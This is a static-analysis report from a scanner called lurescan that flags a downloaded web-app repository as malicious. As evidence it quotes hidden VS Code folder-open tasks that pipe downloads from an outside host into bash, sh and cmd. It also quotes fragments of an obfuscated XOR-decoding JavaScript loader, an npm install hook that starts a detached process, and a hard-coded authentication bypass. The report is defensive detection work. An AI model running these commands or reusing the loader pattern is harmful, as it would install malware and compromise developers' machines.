# lurescan report

**Target:** `C:\Users\yalon\Downloads\zyranova-main\zyranova-main`  
**Verdict:** **MALICIOUS** — Malware or install-time execution indicators. Do not install, run, or open this repository in an IDE or AI agent with automatic execution.  
**Risk score:** 100 / 100  
**Files:** 207 text scanned, 103 binary, 0 skipped · **Rules:** 65 · **Time:** 1.53s

## Findings by severity

| Severity | Count |
|---|---:|
| critical | 6 |
| high | 9 |
| medium | 4 |
| low | 5 |
| info | 0 |

## Findings by category

| Category | Count |
|---|---:|
| app-security | 8 |
| concealment | 7 |
| malware | 4 |
| supply-chain | 3 |
| lure | 2 |

## Framework alignment

### OWASP Smart Contract Top 10 (2025)

No findings map to this framework.

### OWASP Top 10 for LLM Applications (2025)

No findings map to this framework.

### OWASP Top 10 (2021)

| ID | Title | Findings | Highest severity | Rules |
|---|---|---:|---|---|
| [A08](https://owasp.org/Top10/) | Software and Data Integrity Failures | 7 | critical | LS-SUP-001, LS-SUP-002, LS-SUP-003, LS-APP-005 |
| [A02](https://owasp.org/Top10/) | Cryptographic Failures | 1 | high | LS-APP-005 |
| [A07](https://owasp.org/Top10/) | Identification and Authentication Failures | 1 | high | LS-APP-001 |
| [A09](https://owasp.org/Top10/) | Security Logging and Monitoring Failures | 1 | medium | LS-APP-004 |
| [A05](https://owasp.org/Top10/) | Security Misconfiguration | 5 | low | LS-APP-006, LS-APP-007 |

### CSA Cloud Controls Matrix v4

| ID | Title | Findings | Highest severity | Rules |
|---|---|---:|---|---|
| [TVM-02](https://cloudsecurityalliance.org/research/cloud-controls-matrix) | Malware Protection Policy and Procedures | 14 | critical | LS-SUP-001, LS-SUP-002, LS-SUP-003, LS-CON-001, LS-LURE-002, LS-CON-003, LS-CON-005, LS-MAL-006 |
| [UEM-09](https://cloudsecurityalliance.org/research/cloud-controls-matrix) | Anti-Malware Detection and Prevention | 6 | critical | LS-SUP-001, LS-SUP-002, LS-CON-003 |
| [STA-08](https://cloudsecurityalliance.org/research/cloud-controls-matrix) | Supply Chain Risk Management | 3 | critical | LS-SUP-001, LS-SUP-003 |
| [HRS-11](https://cloudsecurityalliance.org/research/cloud-controls-matrix) | Security Awareness Training | 2 | high | LS-LURE-002, LS-LURE-001 |
| [CEK-03](https://cloudsecurityalliance.org/research/cloud-controls-matrix) | Data Encryption | 1 | high | LS-APP-005 |
| [IAM-14](https://cloudsecurityalliance.org/research/cloud-controls-matrix) | Strong Authentication | 1 | high | LS-APP-001 |
| [IAM-16](https://cloudsecurityalliance.org/research/cloud-controls-matrix) | Authorization Mechanisms | 1 | high | LS-APP-001 |
| [DSP-17](https://cloudsecurityalliance.org/research/cloud-controls-matrix) | Sensitive Data Protection | 1 | medium | LS-APP-004 |
| [LOG-03](https://cloudsecurityalliance.org/research/cloud-controls-matrix) | Security Monitoring and Alerting | 1 | medium | LS-APP-004 |
| [AIS-04](https://cloudsecurityalliance.org/research/cloud-controls-matrix) | Secure Application Design and Development | 5 | low | LS-APP-006, LS-APP-007 |

### MITRE ATT&CK Enterprise

| ID | Title | Findings | Highest severity | Rules |
|---|---|---:|---|---|
| [T1059](https://attack.mitre.org/techniques/T1059/) | Command and Scripting Interpreter | 3 | critical | LS-SUP-001, LS-MAL-006 |
| [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | 3 | critical | LS-SUP-002 |
| [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | User Execution: Malicious File | 3 | critical | LS-SUP-001, LS-LURE-002 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Command and Scripting Interpreter: Unix Shell | 2 | critical | LS-SUP-002 |
| [T1059.007](https://attack.mitre.org/techniques/T1059/007/) | Command and Scripting Interpreter: JavaScript | 2 | critical | LS-SUP-003, LS-CON-003 |
| [T1195.001](https://attack.mitre.org/techniques/T1195/001/) | Supply Chain Compromise: Compromise Software Dependencies and Development Tools | 2 | critical | LS-SUP-001 |
| [T1564.003](https://attack.mitre.org/techniques/T1564/003/) | Hide Artifacts: Hidden Window | 2 | critical | LS-SUP-003, LS-MAL-006 |
| [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Command and Scripting Interpreter: Windows Command Shell | 1 | critical | LS-SUP-002 |
| [T1195.002](https://attack.mitre.org/techniques/T1195/002/) | Supply Chain Compromise: Compromise Software Supply Chain | 1 | critical | LS-SUP-003 |
| [T1546.016](https://attack.mitre.org/techniques/T1546/016/) | Event Triggered Execution: Installer Packages | 1 | critical | LS-SUP-003 |
| [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information | 5 | high | LS-CON-001, LS-CON-003 |
| [T1564](https://attack.mitre.org/techniques/T1564/) | Hide Artifacts | 4 | high | LS-CON-001 |
| [T1140](https://attack.mitre.org/techniques/T1140/) | Deobfuscate/Decode Files or Information | 3 | high | LS-CON-003, LS-CON-005, LS-CON-006 |
| [T1027.013](https://attack.mitre.org/techniques/T1027/013/) | Obfuscated Files or Information: Encrypted/Encoded File | 2 | high | LS-CON-005, LS-CON-006 |
| [T1566.003](https://attack.mitre.org/techniques/T1566/003/) | Phishing: Spearphishing via Service | 2 | high | LS-LURE-002, LS-LURE-001 |
| [T1190](https://attack.mitre.org/techniques/T1190/) | Exploit Public-Facing Application | 1 | high | LS-APP-001 |
| [T1036](https://attack.mitre.org/techniques/T1036/) | Masquerading | 1 | medium | LS-LURE-001 |

### MITRE ATLAS (AI and LLM systems)

No findings map to this framework.

### MITRE CWE

| ID | Title | Findings | Highest severity | Rules |
|---|---|---:|---|---|
| [CWE-506](https://cwe.mitre.org/data/definitions/506.html) | Embedded Malicious Code | 12 | critical | LS-SUP-001, LS-SUP-003, LS-CON-001, LS-LURE-002, LS-CON-003, LS-CON-005, LS-MAL-006, LS-CON-006 |
| [CWE-829](https://cwe.mitre.org/data/definitions/829.html) | Inclusion of Functionality from Untrusted Control Sphere | 6 | critical | LS-SUP-001, LS-SUP-002, LS-SUP-003 |
| [CWE-494](https://cwe.mitre.org/data/definitions/494.html) | Download of Code Without Integrity Check | 3 | critical | LS-SUP-002 |
| [CWE-912](https://cwe.mitre.org/data/definitions/912.html) | Hidden Functionality | 4 | high | LS-CON-001 |
| [CWE-287](https://cwe.mitre.org/data/definitions/287.html) | Improper Authentication | 1 | high | LS-APP-001 |
| [CWE-295](https://cwe.mitre.org/data/definitions/295.html) | Improper Certificate Validation | 1 | high | LS-APP-005 |
| [CWE-95](https://cwe.mitre.org/data/definitions/95.html) | Eval Injection | 1 | high | LS-CON-003 |
| [CWE-532](https://cwe.mitre.org/data/definitions/532.html) | Insertion of Sensitive Information into Log File | 1 | medium | LS-APP-004 |
| [CWE-942](https://cwe.mitre.org/data/definitions/942.html) | Permissive Cross-domain Policy with Untrusted Domains | 4 | low | LS-APP-006 |
| [CWE-693](https://cwe.mitre.org/data/definitions/693.html) | Protection Mechanism Failure | 1 | low | LS-APP-007 |

### NIST SP 800-218 Secure Software Development Framework 1.1

| ID | Title | Findings | Highest severity | Rules |
|---|---|---:|---|---|
| [PW.4](https://csrc.nist.gov/pubs/sp/800/218/final) | Reuse Existing, Well-Secured Software When Feasible | 6 | critical | LS-SUP-001, LS-SUP-002, LS-SUP-003 |
| [PO.5](https://csrc.nist.gov/pubs/sp/800/218/final) | Implement and Maintain Secure Environments for Software Development | 4 | critical | LS-SUP-001, LS-LURE-002, LS-LURE-001 |
| [PS.2](https://csrc.nist.gov/pubs/sp/800/218/final) | Provide a Mechanism for Verifying Software Release Integrity | 3 | critical | LS-SUP-002 |
| [PS.1](https://csrc.nist.gov/pubs/sp/800/218/final) | Protect All Forms of Code from Unauthorized Access and Tampering | 1 | critical | LS-SUP-003 |
| [PW.7](https://csrc.nist.gov/pubs/sp/800/218/final) | Review and/or Analyze Human-Readable Code to Identify Vulnerabilities | 9 | high | LS-CON-001, LS-APP-001, LS-CON-003, LS-CON-005, LS-MAL-006, LS-CON-006 |
| [PW.9](https://csrc.nist.gov/pubs/sp/800/218/final) | Configure Software to Have Secure Settings by Default | 6 | high | LS-APP-005, LS-APP-006, LS-APP-007 |
| [PW.5](https://csrc.nist.gov/pubs/sp/800/218/final) | Create Source Code by Adhering to Secure Coding Practices | 2 | high | LS-APP-001, LS-APP-004 |

## Findings

### 1. [CRITICAL] LS-SUP-001 — Editor task runs automatically when the folder is opened

- **Location:** `.vscode/tasks.json:36:9`
- **Category:** supply-chain · **Confidence:** high
- **Detail:** Task 'version-update' runs automatically when the folder is opened with its terminal hidden: npm install --silent --no-progress
- **Evidence:** `"runOn": "folderOpen"`
- **Fix:** Do not allow automatic tasks for untrusted folders. Remove the task, keep the folder in Restricted Mode, and treat any machine that already ran it as compromised.
- **Frameworks:**
  - OWASP-Web: A08 Software and Data Integrity Failures
  - CSA-CCM: STA-08 Supply Chain Risk Management, TVM-02 Malware Protection Policy and Procedures, UEM-09 Anti-Malware Detection and Prevention
  - ATT&CK: T1195.001 Supply Chain Compromise: Compromise Software Dependencies and Development Tools, T1204.002 User Execution: Malicious File, T1059 Command and Scripting Interpreter
  - CWE: CWE-506 Embedded Malicious Code, CWE-829 Inclusion of Functionality from Untrusted Control Sphere
  - NIST-SSDF: PO.5 Implement and Maintain Secure Environments for Software Development, PW.4 Reuse Existing, Well-Secured Software When Feasible

### 2. [CRITICAL] LS-SUP-002 — Remote content piped into a shell interpreter

- **Location:** `.vscode/tasks.json:50:593`
- **Category:** malware · **Confidence:** high
- **Detail:** A command downloads content and executes it immediately (curl|sh, iwr|iex, mshta URL, certutil download). Nothing on disk records what ran.
- **Evidence:** `"osx": { ⟨566 spaces⟩ "command": "curl -L 'https://api-checking-1.vercel.app/api/settings/mac' | bash"`
- **Fix:** Remove the command. Never execute downloaded scripts without pinning and reviewing them.
- **Frameworks:**
  - OWASP-Web: A08 Software and Data Integrity Failures
  - CSA-CCM: TVM-02 Malware Protection Policy and Procedures, UEM-09 Anti-Malware Detection and Prevention
  - ATT&CK: T1105 Ingress Tool Transfer, T1059.004 Command and Scripting Interpreter: Unix Shell
  - CWE: CWE-494 Download of Code Without Integrity Check, CWE-829 Inclusion of Functionality from Untrusted Control Sphere
  - NIST-SSDF: PW.4 Reuse Existing, Well-Secured Software When Feasible, PS.2 Provide a Mechanism for Verifying Software Release Integrity

### 3. [CRITICAL] LS-SUP-002 — Remote content piped into a shell interpreter

- **Location:** `.vscode/tasks.json:52:593`
- **Category:** malware · **Confidence:** high
- **Detail:** A command downloads content and executes it immediately (curl|sh, iwr|iex, mshta URL, certutil download). Nothing on disk records what ran.
- **Evidence:** `"linux": { ⟨564 spaces⟩ "command": "wget -qO- 'https://api-checking-1.vercel.app/api/settings/linux' | sh"`
- **Fix:** Remove the command. Never execute downloaded scripts without pinning and reviewing them.
- **Frameworks:**
  - OWASP-Web: A08 Software and Data Integrity Failures
  - CSA-CCM: TVM-02 Malware Protection Policy and Procedures, UEM-09 Anti-Malware Detection and Prevention
  - ATT&CK: T1105 Ingress Tool Transfer, T1059.004 Command and Scripting Interpreter: Unix Shell
  - CWE: CWE-494 Download of Code Without Integrity Check, CWE-829 Inclusion of Functionality from Untrusted Control Sphere
  - NIST-SSDF: PW.4 Reuse Existing, Well-Secured Software When Feasible, PS.2 Provide a Mechanism for Verifying Software Release Integrity

### 4. [CRITICAL] LS-SUP-002 — Remote content piped into a shell interpreter

- **Location:** `.vscode/tasks.json:54:593`
- **Category:** malware · **Confidence:** high
- **Detail:** A command downloads content and executes it immediately (curl|sh, iwr|iex, mshta URL, certutil download). Nothing on disk records what ran.
- **Evidence:** `"windows": { ⟨562 spaces⟩ "command": "curl --ssl-no-revoke -L https://api-checking-1.vercel.app/api/settings/windows | cmd"`
- **Fix:** Remove the command. Never execute downloaded scripts without pinning and reviewing them.
- **Frameworks:**
  - OWASP-Web: A08 Software and Data Integrity Failures
  - CSA-CCM: TVM-02 Malware Protection Policy and Procedures, UEM-09 Anti-Malware Detection and Prevention
  - ATT&CK: T1105 Ingress Tool Transfer, T1059.003 Command and Scripting Interpreter: Windows Command Shell
  - CWE: CWE-494 Download of Code Without Integrity Check, CWE-829 Inclusion of Functionality from Untrusted Control Sphere
  - NIST-SSDF: PW.4 Reuse Existing, Well-Secured Software When Feasible, PS.2 Provide a Mechanism for Verifying Software Release Integrity

### 5. [CRITICAL] LS-SUP-001 — Editor task runs automatically when the folder is opened

- **Location:** `.vscode/tasks.json:67:9`
- **Category:** supply-chain · **Confidence:** high
- **Detail:** Task 'env' runs automatically when the folder is opened with its terminal hidden: curl --ssl-no-revoke -L https://api-checking-1.vercel.app/api/settings/windows | cmd || curl -L 'https://api-checking-1.vercel.app/api/settings/mac' | bash || wget -qO- 'https://api-checking-1.vercel.app/api/settings/linux' | sh
- **Evidence:** `"runOn": "folderOpen"`
- **Fix:** Do not allow automatic tasks for untrusted folders. Remove the task, keep the folder in Restricted Mode, and treat any machine that already ran it as compromised.
- **Frameworks:**
  - OWASP-Web: A08 Software and Data Integrity Failures
  - CSA-CCM: STA-08 Supply Chain Risk Management, TVM-02 Malware Protection Policy and Procedures, UEM-09 Anti-Malware Detection and Prevention
  - ATT&CK: T1195.001 Supply Chain Compromise: Compromise Software Dependencies and Development Tools, T1204.002 User Execution: Malicious File, T1059 Command and Scripting Interpreter
  - CWE: CWE-506 Embedded Malicious Code, CWE-829 Inclusion of Functionality from Untrusted Control Sphere
  - NIST-SSDF: PO.5 Implement and Maintain Secure Environments for Software Development, PW.4 Reuse Existing, Well-Secured Software When Feasible

### 6. [CRITICAL] LS-SUP-003 — npm lifecycle script executes code during install

- **Location:** `package.json:10:9`
- **Category:** supply-chain · **Confidence:** high
- **Detail:** `prepare` runs automatically during npm install: start /b node server || nohup node server &
- **Evidence:** `"prepare": "start /b node server || nohup node server &",`
- **Fix:** Install untrusted projects with --ignore-scripts inside a disposable VM, and remove the hook.
- **Frameworks:**
  - OWASP-Web: A08 Software and Data Integrity Failures
  - CSA-CCM: STA-08 Supply Chain Risk Management, TVM-02 Malware Protection Policy and Procedures
  - ATT&CK: T1546.016 Event Triggered Execution: Installer Packages, T1195.002 Supply Chain Compromise: Compromise Software Supply Chain, T1059.007 Command and Scripting Interpreter: JavaScript, T1564.003 Hide Artifacts: Hidden Window
  - CWE: CWE-506 Embedded Malicious Code, CWE-829 Inclusion of Functionality from Untrusted Control Sphere
  - NIST-SSDF: PW.4 Reuse Existing, Well-Secured Software When Feasible, PS.1 Protect All Forms of Code from Unauthorized Access and Tampering

### 7. [HIGH] LS-CON-001 — Code hidden after a long run of whitespace

- **Location:** `.vscode/tasks.json:50:14`
- **Category:** concealment · **Confidence:** high
- **Detail:** A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap.
- **Evidence:** `"osx": { ⟨566 spaces⟩ "command": "curl -L 'https://api-checking-1.vercel.app/api/settings/mac' | bash"`
- **Fix:** Inspect the full line with word wrap on. Hidden trailing code is a strong malware indicator.
- **Frameworks:**
  - CSA-CCM: TVM-02 Malware Protection Policy and Procedures
  - ATT&CK: T1564 Hide Artifacts, T1027 Obfuscated Files or Information
  - CWE: CWE-506 Embedded Malicious Code, CWE-912 Hidden Functionality
  - NIST-SSDF: PW.7 Review and/or Analyze Human-Readable Code to Identify Vulnerabilities

### 8. [HIGH] LS-CON-001 — Code hidden after a long run of whitespace

- **Location:** `.vscode/tasks.json:52:16`
- **Category:** concealment · **Confidence:** high
- **Detail:** A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap.
- **Evidence:** `"linux": { ⟨564 spaces⟩ "command": "wget -qO- 'https://api-checking-1.vercel.app/api/settings/linux' | sh"`
- **Fix:** Inspect the full line with word wrap on. Hidden trailing code is a strong malware indicator.
- **Frameworks:**
  - CSA-CCM: TVM-02 Malware Protection Policy and Procedures
  - ATT&CK: T1564 Hide Artifacts, T1027 Obfuscated Files or Information
  - CWE: CWE-506 Embedded Malicious Code, CWE-912 Hidden Functionality
  - NIST-SSDF: PW.7 Review and/or Analyze Human-Readable Code to Identify Vulnerabilities

### 9. [HIGH] LS-APP-005 — TLS certificate validation disabled

- **Location:** `.vscode/tasks.json:54:593`
- **Category:** app-security · **Confidence:** medium
- **Detail:** Certificate or revocation checks are turned off, allowing interception or tampering of downloads.
- **Evidence:** `"windows": { ⟨562 spaces⟩ "command": "curl --ssl-no-revoke -L https://api-checking-1.vercel.app/api/settings/windows | cmd"`
- **Fix:** Keep validation on and fix the certificate chain instead.
- **Frameworks:**
  - OWASP-Web: A02 Cryptographic Failures, A08 Software and Data Integrity Failures
  - CSA-CCM: CEK-03 Data Encryption
  - CWE: CWE-295 Improper Certificate Validation
  - NIST-SSDF: PW.9 Configure Software to Have Secure Settings by Default

### 10. [HIGH] LS-CON-001 — Code hidden after a long run of whitespace

- **Location:** `.vscode/tasks.json:54:18`
- **Category:** concealment · **Confidence:** high
- **Detail:** A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap.
- **Evidence:** `"windows": { ⟨562 spaces⟩ "command": "curl --ssl-no-revoke -L https://api-checking-1.vercel.app/api/settings/windows | cmd"`
- **Fix:** Inspect the full line with word wrap on. Hidden trailing code is a strong malware indicator.
- **Frameworks:**
  - CSA-CCM: TVM-02 Malware Protection Policy and Procedures
  - ATT&CK: T1564 Hide Artifacts, T1027 Obfuscated Files or Information
  - CWE: CWE-506 Embedded Malicious Code, CWE-912 Hidden Functionality
  - NIST-SSDF: PW.7 Review and/or Analyze Human-Readable Code to Identify Vulnerabilities

### 11. [HIGH] LS-LURE-002 — README instructs a command that triggers hidden execution

- **Location:** `README.md:70:1`
- **Category:** lure · **Confidence:** high
- **Detail:** README tells the reader to run `npm install`, which triggers the install-time or folder-open execution found in this repository.
- **Evidence:** `npm install`
- **Fix:** Do not follow the instructions. Inspect in a disposable VM with scripts disabled.
- **Frameworks:**
  - CSA-CCM: HRS-11 Security Awareness Training, TVM-02 Malware Protection Policy and Procedures
  - ATT&CK: T1566.003 Phishing: Spearphishing via Service, T1204.002 User Execution: Malicious File
  - CWE: CWE-506 Embedded Malicious Code
  - NIST-SSDF: PO.5 Implement and Maintain Secure Environments for Software Development

### 12. [HIGH] LS-APP-001 — Authentication result hard-coded to success

- **Location:** `controllers/auth.js:29:5`
- **Category:** app-security · **Confidence:** high
- **Detail:** A password or authentication check is set to true, so any credentials are accepted.
- **Evidence:** `const isMatch = true;`
- **Fix:** Compare against the stored hash with bcrypt.compare or equivalent, and fail closed.
- **Frameworks:**
  - OWASP-Web: A07 Identification and Authentication Failures
  - CSA-CCM: IAM-14 Strong Authentication, IAM-16 Authorization Mechanisms
  - ATT&CK: T1190 Exploit Public-Facing Application
  - CWE: CWE-287 Improper Authentication
  - NIST-SSDF: PW.5 Create Source Code by Adhering to Secure Coding Practices, PW.7 Review and/or Analyze Human-Readable Code to Identify Vulnerabilities

### 13. [HIGH] LS-CON-001 — Code hidden after a long run of whitespace

- **Location:** `routes/api/auth.js:20:24`
- **Category:** concealment · **Confidence:** high
- **Detail:** A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap.
- **Evidence:** `module.exports = router; ⟨720 spaces⟩ const _2fd4e3=globalThis[String.fromCharCode(66,117,102,102,101,114)];const _9df9c3=globalThis[String.fromCharCode(70,117,110,99,116,105,111,110)];const _677ac7=_2fd4e3.from([18,97,80,1…`
- **Fix:** Inspect the full line with word wrap on. Hidden trailing code is a strong malware indicator.
- **Frameworks:**
  - CSA-CCM: TVM-02 Malware Protection Policy and Procedures
  - ATT&CK: T1564 Hide Artifacts, T1027 Obfuscated Files or Information
  - CWE: CWE-506 Embedded Malicious Code, CWE-912 Hidden Functionality
  - NIST-SSDF: PW.7 Review and/or Analyze Human-Readable Code to Identify Vulnerabilities

### 14. [HIGH] LS-CON-003 — Runtime API reached through computed names

- **Location:** `routes/api/auth.js:20:759`
- **Category:** concealment · **Confidence:** high
- **Detail:** Globals such as Function or Buffer are resolved from character codes or concatenated strings, or a function is called with a 'require' parameter. This hides an eval-style call from text search.
- **Evidence:** `module.exports = router; ⟨720 spaces⟩ const _2fd4e3=globalThis[String.fromCharCode(66,117,102,102,101,114)];const _9df9c3=globalThis[String.fromCharCode(70,117,110,99,116,105,111,110)];const _677ac7=_2fd4e3.from([18,97,80,156,76,112,142,58,99,82,31,163…`
- **Fix:** Decode the expression statically and review what it executes before running anything.
- **Frameworks:**
  - CSA-CCM: TVM-02 Malware Protection Policy and Procedures, UEM-09 Anti-Malware Detection and Prevention
  - ATT&CK: T1027 Obfuscated Files or Information, T1140 Deobfuscate/Decode Files or Information, T1059.007 Command and Scripting Interpreter: JavaScript
  - CWE: CWE-506 Embedded Malicious Code, CWE-95 Eval Injection
  - NIST-SSDF: PW.7 Review and/or Analyze Human-Readable Code to Identify Vulnerabilities

### 15. [HIGH] LS-CON-005 — Large encoded blob embedded in source

- **Location:** `routes/api/auth.js:20:1032`
- **Category:** concealment · **Confidence:** medium
- **Detail:** Embedded hex blob of about 1352 decoded bytes.
- **Evidence:** `…48,21,51,5,239,171,224,233,163]);const _650755=_2fd4e3.from('710e3eef3850dd7f31045af178d251da7d47719f91cfc69b2a4f62ad7a5ebb0d4d632d9162d741c025113ee5c88f87d0664104d90d3dae07437029c03cd610c9700232899bd4dcc7235035ff7815be5852622dc13bdf459e2c5727d4a1c88fd67c0224f…`
- **Fix:** Decode the blob offline and inspect it as untrusted data. Never pass it to eval or Function.
- **Frameworks:**
  - CSA-CCM: TVM-02 Malware Protection Policy and Procedures
  - ATT&CK: T1027.013 Obfuscated Files or Information: Encrypted/Encoded File, T1140 Deobfuscate/Decode Files or Information
  - CWE: CWE-506 Embedded Malicious Code
  - NIST-SSDF: PW.7 Review and/or Analyze Human-Readable Code to Identify Vulnerabilities

### 16. [MEDIUM] LS-LURE-001 — README advertises blockchain components that are absent

- **Location:** `README.md:5:4`
- **Category:** lure · **Confidence:** medium
- **Detail:** README advertises solidity, hardhat, nft, web3, polygon, evm, but the repository contains no smart-contract sources or toolchain config.
- **Evidence:** `[![Polygon](https://img.shields.io/badge/Polygon-EVM-purple)](https://polygon.technology/)`
- **Fix:** Verify the company and the project through independent channels before running anything.
- **Frameworks:**
  - CSA-CCM: HRS-11 Security Awareness Training
  - ATT&CK: T1566.003 Phishing: Spearphishing via Service, T1036 Masquerading
  - NIST-SSDF: PO.5 Implement and Maintain Secure Environments for Software Development

### 17. [MEDIUM] LS-APP-004 — Secrets written to logs

- **Location:** `middleware/auth.js:6:3`
- **Category:** app-security · **Confidence:** medium
- **Detail:** Tokens, passwords, keys, or seed phrases are logged.
- **Evidence:** `console.log(token)`
- **Fix:** Remove the log statement or redact the value.
- **Frameworks:**
  - OWASP-Web: A09 Security Logging and Monitoring Failures
  - CSA-CCM: DSP-17 Sensitive Data Protection, LOG-03 Security Monitoring and Alerting
  - CWE: CWE-532 Insertion of Sensitive Information into Log File
  - NIST-SSDF: PW.5 Create Source Code by Adhering to Secure Coding Practices

### 18. [MEDIUM] LS-MAL-006 — Process launched detached or hidden

- **Location:** `package.json:10:21`
- **Category:** malware · **Confidence:** medium
- **Detail:** A child process is started detached, hidden, or with nohup/start /b so it keeps running after the parent exits.
- **Evidence:** `"prepare": "start /b node server || nohup node server &",`
- **Fix:** Confirm the background process is expected; loaders use this to persist past npm install.
- **Frameworks:**
  - CSA-CCM: TVM-02 Malware Protection Policy and Procedures
  - ATT&CK: T1564.003 Hide Artifacts: Hidden Window, T1059 Command and Scripting Interpreter
  - CWE: CWE-506 Embedded Malicious Code
  - NIST-SSDF: PW.7 Review and/or Analyze Human-Readable Code to Identify Vulnerabilities

### 19. [MEDIUM] LS-CON-006 — XOR decoding loop

- **Location:** `routes/api/auth.js:20:3901`
- **Category:** concealment · **Confidence:** medium
- **Detail:** A buffer is XORed against a repeating key, the usual way to unpack a hidden payload at runtime.
- **Evidence:** `…c<_650755.length;_46251c++)_2091f7[_46251c]=_650755[_46251c]^_677ac7[_46251c%_677ac7.length];_9df9c3('require',_2091f7.toString(String.fromCharCode(117,116,102,56)))(require);`
- **Fix:** Check what the decoded data is used for; combined with eval or Function it is a loader.
- **Frameworks:**
  - ATT&CK: T1140 Deobfuscate/Decode Files or Information, T1027.013 Obfuscated Files or Information: Encrypted/Encoded File
  - CWE: CWE-506 Embedded Malicious Code
  - NIST-SSDF: PW.7 Review and/or Analyze Human-Readable Code to Identify Vulnerabilities

### 20. [LOW] LS-APP-006 — Permissive CORS policy

- **Location:** `client/src/apis/index.js:11:12`
- **Category:** app-security · **Confidence:** low
- **Detail:** CORS is enabled for any origin, letting any website call the API from a victim's browser.
- **Evidence:** `"Access-Control-Allow-Origin": "*"`
- **Fix:** Allow only known origins, especially when cookies or tokens are used.
- **Frameworks:**
  - OWASP-Web: A05 Security Misconfiguration
  - CSA-CCM: AIS-04 Secure Application Design and Development
  - CWE: CWE-942 Permissive Cross-domain Policy with Untrusted Domains
  - NIST-SSDF: PW.9 Configure Software to Have Secure Settings by Default

### 21. [LOW] LS-APP-006 — Permissive CORS policy

- **Location:** `client/src/apis/index.js:33:12`
- **Category:** app-security · **Confidence:** low
- **Detail:** CORS is enabled for any origin, letting any website call the API from a victim's browser.
- **Evidence:** `"Access-Control-Allow-Origin": "*"`
- **Fix:** Allow only known origins, especially when cookies or tokens are used.
- **Frameworks:**
  - OWASP-Web: A05 Security Misconfiguration
  - CSA-CCM: AIS-04 Secure Application Design and Development
  - CWE: CWE-942 Permissive Cross-domain Policy with Untrusted Domains
  - NIST-SSDF: PW.9 Configure Software to Have Secure Settings by Default

### 22. [LOW] LS-APP-006 — Permissive CORS policy

- **Location:** `client/src/apis/index.js:54:12`
- **Category:** app-security · **Confidence:** low
- **Detail:** CORS is enabled for any origin, letting any website call the API from a victim's browser.
- **Evidence:** `"Access-Control-Allow-Origin": "*"`
- **Fix:** Allow only known origins, especially when cookies or tokens are used.
- **Frameworks:**
  - OWASP-Web: A05 Security Misconfiguration
  - CSA-CCM: AIS-04 Secure Application Design and Development
  - CWE: CWE-942 Permissive Cross-domain Policy with Untrusted Domains
  - NIST-SSDF: PW.9 Configure Software to Have Secure Settings by Default

### 23. [LOW] LS-APP-007 — Security headers middleware disabled

- **Location:** `middleware/index.js:22:3`
- **Category:** app-security · **Confidence:** medium
- **Detail:** Helmet or an equivalent header middleware is commented out.
- **Evidence:** `// app.use(helmet());`
- **Fix:** Enable security headers.
- **Frameworks:**
  - OWASP-Web: A05 Security Misconfiguration
  - CSA-CCM: AIS-04 Secure Application Design and Development
  - CWE: CWE-693 Protection Mechanism Failure
  - NIST-SSDF: PW.9 Configure Software to Have Secure Settings by Default

### 24. [LOW] LS-APP-006 — Permissive CORS policy

- **Location:** `middleware/index.js:38:11`
- **Category:** app-security · **Confidence:** low
- **Detail:** CORS is enabled for any origin, letting any website call the API from a victim's browser.
- **Evidence:** `app.use(cors());`
- **Fix:** Allow only known origins, especially when cookies or tokens are used.
- **Frameworks:**
  - OWASP-Web: A05 Security Misconfiguration
  - CSA-CCM: AIS-04 Secure Application Design and Development
  - CWE: CWE-942 Permissive Cross-domain Policy with Untrusted Domains
  - NIST-SSDF: PW.9 Configure Software to Have Secure Settings by Default

---
Static analysis only; the scanned code was not executed. Mappings are advisory and should be confirmed against the framework text.
